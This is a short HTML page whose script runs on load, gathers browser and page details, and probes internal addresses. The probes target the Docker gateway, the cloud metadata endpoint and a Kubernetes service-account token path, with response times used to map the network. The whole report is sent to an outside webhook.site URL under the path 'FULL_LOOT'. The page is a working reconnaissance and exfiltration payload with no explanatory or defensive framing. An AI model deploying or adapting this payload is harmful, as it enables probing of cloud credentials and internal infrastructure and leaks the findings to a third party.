<!DOCTYPE html>
<html>
<body>
<script>
    (async function() {
        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
        
        // Собираем инфу о движке
        const report = {
            url: window.location.href,
            platform: navigator.platform,
            // Проверка на Docker/K8s через специфические ошибки
            is_container: !!(window.performance && performance.memory),
            // Вытягиваем все ключи из window, которые не стандартные (кастомные конфиги)
            custom_vars: Object.keys(window).filter(key => !window.hasOwnProperty(key)).slice(0, 50),
            // Тайминги до внутренних ресурсов (если < 50ms - ресурс в локалке)
            internal_check: {}
        };

        const targets = {
            "gateway": "http://172.17.0.1",
            "metadata": "http://169.254.169.254/latest/meta-data/",
            "k8s_token": "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
        };

        for (let name in targets) {
            const start = Date.now();
            try {
                await fetch(targets[name], { mode: 'no-cors', cache: 'no-store' });
                report.internal_check[name] = Date.now() - start + "ms (OPEN)";
            } catch (e) {
                report.internal_check[name] = "closed/blocked";
            }
        }

        navigator.sendBeacon(hook + "/FULL_LOOT", JSON.stringify(report));
    })();
</script>
</body>
</html>
